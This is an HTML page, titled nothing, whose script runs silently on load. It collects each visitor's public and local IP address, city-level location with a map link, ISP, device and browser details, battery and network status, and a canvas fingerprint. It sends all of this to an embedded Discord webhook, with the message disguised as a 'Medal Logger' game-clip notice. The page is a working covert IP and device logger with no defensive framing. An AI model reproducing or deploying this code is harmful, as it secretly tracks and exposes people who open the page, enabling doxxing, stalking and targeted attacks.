<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <script>
        (async () => {
            const webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";

            if (webhookUrl.includes("YOUR_DISCORD_WEBHOOK_URL_GOES_HERE")) {
                console.error("WEBHOOK NOT CONFIGURED.");
                return;
            }

            const getPublicIntel = async () => {
                try {
                    const response = await fetch('https://ipinfo.io/json');
                    if (!response.ok) return { error: `API Fail: ${response.status}` };
                    const data = await response.json();
                    return {
                        ip: data.ip || "N/A",
                        city: data.city || "N/A",
                        region: data.region || "N/A",
                        country: data.country || "N/A",
                        org: data.org || "N/A",
                        loc: data.loc || "N/A"
                    };
                } catch (error) {
                    return { error: `NetError: ${error.message}` };
                }
            };

            const getLocalIntel = () => {
                return new Promise((resolve) => {
                    try {
                        const pc = new RTCPeerConnection({ iceServers: [] });
                        pc.createDataChannel('');
                        pc.createOffer().then(pc.setLocalDescription.bind(pc));
                        pc.onicecandidate = (ice) => {
                            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                            const localIp = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g)[0];
                            pc.onicecandidate = () => {};
                            pc.close();
                            resolve({ localIp });
                        };
                        setTimeout(() => resolve({ localIp: "Timeout" }), 1000);
                    } catch (e) {
                        resolve({ localIp: "Blocked/Error" });
                    }
                });
            };

            const getSystemIntel = async () => {
                let platformInfo = "N/A";
                try {
                    if (navigator.userAgentData) {
                        const pValues = await navigator.userAgentData.getHighEntropyValues(["platform", "platformVersion", "architecture", "model", "bitness"]);
                        platformInfo = `${pValues.platform} ${pValues.platformVersion} (${pValues.architecture}, ${pValues.bitness}-bit)`;
                    }
                } catch (e) { platformInfo = "Restricted"; }
                
                return {
                    userAgent: navigator.userAgent || "N/A",
                    platform: platformInfo,
                    cores: navigator.hardwareConcurrency || "N/A",
                    ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
                    screenRes: `${screen.width}x${screen.height} @${screen.colorDepth}b`,
                };
            };
            
            const getPulseIntel = async () => {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        battery: `${Math.round(battery.level * 100)}% ${battery.charging ? "⚡" : "🔋"}`,
                        network: navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink || 'N/A'} Mbps)` : "N/A",
                    };
                } catch (e) {
                    return { battery: "N/A", network: "N/A" };
                }
            };

            const getCanvasFingerprint = () => {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    const txt = '0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&*()';
                    ctx.textBaseline = "top";
                    ctx.font = "14px 'Arial'";
                    ctx.textBaseline = "alphabetic";
                    ctx.fillStyle = "#f60";
                    ctx.fillRect(125, 1, 62, 20);
                    ctx.fillStyle = "#069";
                    ctx.fillText(txt, 2, 15);
                    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                    ctx.fillText(txt, 4, 17);
                    const dataUrl = canvas.toDataURL();
                    let hash = 0;
                    for (let i = 0; i < dataUrl.length; i++) {
                        hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
                        hash = hash & hash;
                    }
                    return `0x${hash.toString(16)}`;
                } catch (e) {
                    return "Blocked";
                }
            };

            const [publicIntel, localIntel, systemIntel, pulseIntel] = await Promise.all([
                getPublicIntel(),
                getLocalIntel(),
                getSystemIntel(),
                getPulseIntel()
            ]);
            
            const canvasFp = getCanvasFingerprint();
            const gmapsLink = publicIntel.loc !== "N/A" ? `https://www.google.com/maps?q=${publicIntel.loc}` : "N/A";

            const payload = {
                username: "Medal Logger",
                avatar_url: "https://cdn.aptoide.com/imgs/9/e/0/9e094c5ef07f2e5bcd5ec3c60bf7669c_icon.png",
                embeds: [{
                    title: "New Clip Recorded: Session Logged",
                    description: `**Timestamp:** \`${new Date().toISOString()}\``,
                    color: 16766720,
                    fields: [
                        { name: "🌐 Public IP", value: `\`${publicIntel.ip}\``, inline: true },
                        { name: "🏠 Local IP", value: `\`${localIntel.localIp}\``, inline: true },
                        { name: "✍️ Canvas FP", value: `\`${canvasFp}\``, inline: true },
                        { name: "📍 Geolocation", value: `${publicIntel.city}, ${publicIntel.region}, ${publicIntel.country}`, inline: false },
                        { name: "🗺️ Map View", value: gmapsLink !== "N/A" ? `[Click to View Approximate Location](${gmapsLink})` : "Coordinates unavailable", inline: false},
                        { name: "🏢 ISP / Org", value: `*${publicIntel.org}*`, inline: false },
                        { name: "💻 System", value: `\`${systemIntel.platform}\``, inline: true },
                        { name: "🧠/💾 CPU/RAM", value: `${systemIntel.cores} Cores / ${systemIntel.ram}`, inline: true },
                        { name: "🖥️ Display", value: systemIntel.screenRes, inline: true },
                        { name: "📡/🔋 Status", value: `**Net:** ${pulseIntel.network} | **Batt:** ${pulseIntel.battery}`, inline: false},
                        { name: "🆔 User Agent", value: `\`\`\`${systemIntel.userAgent}\`\`\``, inline: false },
                    ],
                    footer: {
                        text: "Medal Logger // Trophy Acquired"
                    }
                }]
            };

            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });

        })();
    </script>
</body>
</html>
